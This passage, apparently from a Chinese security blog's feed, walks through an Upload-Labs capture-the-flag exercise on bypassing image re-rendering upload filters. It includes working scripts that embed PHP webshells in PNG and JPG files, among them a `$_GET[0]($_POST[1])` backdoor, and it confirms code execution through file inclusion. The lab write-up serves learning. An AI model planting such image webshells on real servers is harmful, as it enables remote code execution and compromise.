($filetype==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        .....</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    提示：<code>本pass重新渲染了图片！</code>。说明对图片进行了二次渲染，我的理解就是把上传的图片，根据一些标准，只把图片中的图片信息提取出来，再生成一个图片，可以有效避免图片马。</p><p>​    首先是分析一波源码：</p><p>​    以jpg文件判定为例。获取文件名、类型、临时文件路径，获取文件后缀，进入jpg图片判定，判定的方式是通过文件后缀和文件的类型判定，再执行<code>move_uploaded_file</code>函数先把文件移动到<code>upload</code>文件夹，现在文件路径是<code>$target_path</code>，之后对图片进行二次渲染。</p><p>​    二次渲染用到了<code>imagecreatefromjpeg</code>函数，官方解释：由文件或 URL 创建一个新图象，返回一图像标识符，代表了从给定的文件名取得的图像（这时候图像对象还是一个空的）。然后判断是否是一个图片文件，如果不是的话执行<code>unlink</code>函数删除文件，否则，为新图片随机一个名称，执行<code>imagejpeg</code>函数把图象输出到新文件<code> $newfilename</code>。再将之前用户上传的文件<code>$target_path</code>删除掉。</p><p>​    根据上面的分析就能得出来两种思路：</p><ol><li><strong>访问二次渲染之前的上传的文件。</strong></li><li><strong>在图片二次渲染以后图片马未失效。</strong></li></ol><h2 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h2><p>​    （Linux环境、php版本7.2.21）</p><p>​    因为二次渲染那部分<code>if、else</code>无论如何都会执行<code>unlink</code>函数删除你的文件，需要在执行<code>imagecreatefromjpeg</code>时报错才能访问到自己原来上传的文件。</p><h3 id="jpg格式"><a href="#jpg格式" class="headerlink" title="jpg格式"></a>jpg格式</h3><h4 id="准备并上传"><a href="#准备并上传" class="headerlink" title="准备并上传"></a>准备并上传</h4><p>​    需要准备只含有一句话木马的文件并命名为.jpg格式。直接上传。</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116200050.png"></p><h4 id="文件包含验证"><a href="#文件包含验证" class="headerlink" title="文件包含验证"></a>文件包含验证</h4><p>​    上传以后我使用的在线靶场网页中题目部分直接消失了，这就说明函数执行过程中出错导致页面也没有正常返回。然后就可以使用<code>inclue.php</code>文件包含访问刚刚上传的文件</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116200401.png">    </p><h3 id="其他格式"><a href="#其他格式" class="headerlink" title="其他格式"></a>其他格式</h3><p>​    如图成功访问就是图片马上传成功了。但是这个方法我只有<code>jpg</code>格式的文件上传成功了，另外两种格式的图片没有上传成功，这个我感觉需要了解<code>imagecreatefromjpeg</code>、<code>imagecreatefrompng</code>、<code>imagecreatefromgif</code>，这三个函数的原理，让其报错即可。</p><h2 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h2><p>​    （windows环境，php版本5.2.17）</p><p>​    这种方法是让图片码在经过二次渲染以后，能保证代码不会被二次渲染给过滤掉。从最简单的一个一个来。</p><p>​    用到的工具是<strong>Beyond Compare 4</strong>，是一个文件比较的工具，就是查看图片渲染修改的哪些部分，还可以查看文件的16进制格式。</p><h3 id="GIF格式"><a href="#GIF格式" class="headerlink" title="GIF格式"></a>GIF格式</h3><h4 id="准备并上传-1"><a href="#准备并上传-1" class="headerlink" title="准备并上传"></a>准备并上传</h4><p>​    上传一个使用<code>copy /b</code>指令制作的图片马，之前文章第13题用过。假设上传的图片马为<strong>yoo.gif</strong>，上传成功以后再下载下载的文件名为<strong>2119840023.gif</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116203245.png"></p><h4 id="文件比较"><a href="#文件比较" class="headerlink" title="文件比较"></a>文件比较</h4><p>​    使用前面说的<strong>Beyond Compare 4</strong>工具进行比较，左边是渲染前的文件，右边是渲染后的文件，图片中白色的地方就是两个文件<strong>相同</strong>的地方，红色部分则是文件不同的地方。看的出来图片文件的前面一大部分二次渲染的时候都没有改变，所以我们可以直接将代码放在这一部分逃过二次渲染。<code>&lt;?php phpinfo(); ?&gt;</code>的十六进制是<code>3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 20 3F 3E</code>直接粘贴插入，在右边框中右键保存文件再进行上传。</p><h4 id="文件包含验证-1"><a href="#文件包含验证-1" class="headerlink" title="文件包含验证"></a>文件包含验证</h4><p>​    上传以后进行文件包含，代码执行成功。</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116204104.png"></p><p>​    为了验证我们的想法，我们可以刚刚把上传的图片再下载下载，查看插入的代码是否逃过了二次渲染（废话执行成功了代码肯定在）。</p><h3 id="png格式"><a href="#png格式" class="headerlink" title="png格式"></a>png格式</h3><p>​    这题自己原来打算模仿gif的方法修改图片，但是上传以后下载，对比文件十六进制不同的时候我傻了</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116204635.png"></p><p>​    这不同还是一段一段的，根本不可能模仿gif的方法，上面那一段相同的还是图片的<strong>头标识</strong>部分，修改的话就不是png格式图片，更过不了。</p><p>​    所以我直接看答案了，还是前言里的<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-3">博客</a>。png图片由3个以上的数据块组成，然后又分了图片基本信息、实际数据块、辅助数据块blablablabl，而且数据块中还有CRC码，学过计算机网络的都知道CRC码是验证错误的，自己随便插入代码以后不修改CRC码肯定是过不了的。</p><p>​    所以又出来了两种方法：</p><ol><li>修改CRC码</li><li>直接生成图片</li></ol><h4 id="计算CRC码"><a href="#计算CRC码" class="headerlink" title="计算CRC码"></a>计算CRC码</h4><p>​    计算CRC码的<code>python</code>脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">png &#x3D; open(r&#39;1.png&#39;,&#39;rb&#39;)</span><br><span class="line">a &#x3D; png.read()</span><br><span class="line">png.close()</span><br><span class="line">hexstr &#x3D; binascii.b2a_hex(a)</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39; PLTE crc &#39;&#39;&#39;</span><br><span class="line">data &#x3D;  &#39;504c5445&#39;+ re.findall(&#39;504c5445(.*?)49444154&#39;,hexstr)[0]</span><br><span class="line">crc &#x3D; binascii.crc32(data[:-16].decode(&#39;hex&#39;)) &amp; 0xffffffff</span><br><span class="line">print hex(crc)</span><br></pre></td></tr></table></figure><h5 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h5><p>​    php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以在该部分<strong>写入代码</strong>，再重新计算CRC码，再修改原来的CRC码即可。</p><h5 id="计算CRC码-1"><a href="#计算CRC码-1" class="headerlink" title="计算CRC码"></a>计算CRC码</h5><p>​    脚本会打开名为1.png的文件然后输出计算以后的CRC码结果。在把结果覆盖原来的CRC码上传图片就不会出错了。</p><p>这个方法我没有尝试，因为我不会python。<del>都2020年了还有人不会python，不会吧不会吧</del>。😒</p><p>等我学会在回来改这一篇吧。</p><h4 id="直接生成图片（写入实际数据模块）"><a href="#直接生成图片（写入实际数据模块）" class="headerlink" title="直接生成图片（写入实际数据模块）"></a>直接生成图片（写入实际数据模块）</h4><p>​    国外大牛的脚本，直接运行就会生成一个图片</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p &#x3D; array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class="line">           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">           0x66, 0x44, 0x50, 0x33);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img &#x3D; imagecreatetruecolor(32, 32);</span><br><span class="line"></span><br><span class="line">for ($y &#x3D; 0; $y &lt; sizeof($p); $y +&#x3D; 3) &#123;</span><br><span class="line">   $r &#x3D; $p[$y];</span><br><span class="line">   $g &#x3D; $p[$y+1];</span><br><span class="line">   $b &#x3D; $p[$y+2];</span><br><span class="line">   $color &#x3D; imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y &#x2F; 3), 0, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,&#39;.&#x2F;1.png&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>​    php指令怎么执行？如果你本机有php环境，可以在php的根目录下找到一个名为<code>php.exe</code>的可执行文件，它是php提供的一种<strong>CLI</strong>模式，也就是<strong>命令行模式</strong>。我把php脚本放在了php的根目录，然后cmd切换到对应目录执行。</p><p>​    还有一种方法是借用本地搭建的靶机环境，把php放在目录使用浏览器访问一下即可。</p><p>​    运行成功以后会找到一个名为<strong>1.png</strong>的图片。这个就是生成的图片马了。可以尝试上传进行渲染以后下载到本地，使用文件比较验证。</p><p>​    但是这个生成的图片php代码是<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>，应该是个一句话木马但是现在的我还不会用。源码也不知道怎么修改，总之图片渲染以后代码没有被去掉就算成功了吧，<del>应该算吧</del></p><h3 id="jpg格式-1"><a href="#jpg格式-1" class="headerlink" title="jpg格式"></a>jpg格式</h3><p>​    同样看答案。国外大牛写的脚本jpg_payload.php，可以向jpg图片里写入代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    $miniPayload = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">        $outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">        $extraBytes = <span class="number">0</span>;</span><br><span class="line">        $correctImage = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            <span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params">$filename, $data, $unlink = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        <span class="keyword">if</span>($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        <span class="keyword">return</span> $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params">$errno, $errstr, $errfile, $errline</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, $errstr, $m)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) &#123;</span><br><span class="line">                $extraBytes = (<span class="keyword">int</span>)$m[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $binData;</span><br><span class="line">        <span class="keyword">private</span> $order;</span><br><span class="line">        <span class="keyword">private</span> $size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$filename, $order = <span class="literal">false</span>, $fromString = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">            <span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.$filename.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params">$skip</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="准备-1"><a href="#准备-1" class="headerlink" title="准备"></a>准备</h4><p>​    准备一个<strong>yoo.jpg</strong>图片，上传经过渲染以后再下载下到本地，保存为<strong>1.jpg</strong>。</p><h4 id="插入代码"><a href="#插入代码" class="headerlink" title="插入代码"></a>插入代码</h4><p>​    使用脚本处理<strong>1.jpg</strong>插入php代码，执行命令<code>php jpg_payload.php 1.jpg</code>。php命令执行方法上面有。执行成功以后应该如图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116212640.png"></p><p>​    执行的目录下会多出一个名为<code>payload_1.jpg</code>的文件，这就是制作好的图片马。大佬的源码我是修改了一下的，可以修改上面的第25行代码，自定义插入想要的代码。</p><h4 id="上传并验证"><a href="#上传并验证" class="headerlink" title="上传并验证"></a>上传并验证</h4><p>​    上传以后同样先确定图片的名称和地址，适用文件包含进行验证</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116215008.png"></p><p>​    如果如图所示，我们的图片马就上传成功了。<strong>需要提醒：有些图片不行可能需要多换几个图片试一试！！！</strong></p><p>呼，终于可以休息了。</p>]]></content>
      
      
      <categories>
          
          <category> DROPS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload-Labs(三)</title>
      <link href="2020/Upload-Labs3/"/>
      <url>2020/Upload-Labs3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    继续接着上一次的<code>Upload-labs</code>往下写。这记下第11-15题，目前进度是20题都已经完成正在抽时间写博客，然后16题是我卡的最久的关，不过也学到了感觉很牛的姿势，所以到时候专门开一篇只讲16。</p><p>​    在线靶机地址：</p><ul><li><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#Upload-Labs-Linux">linux环境</a></li><li><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[Windows]Upload-Labs-Windows">windows环境</a></li></ul><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>​    (这题使用了windows环境)</p><p>​    源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span 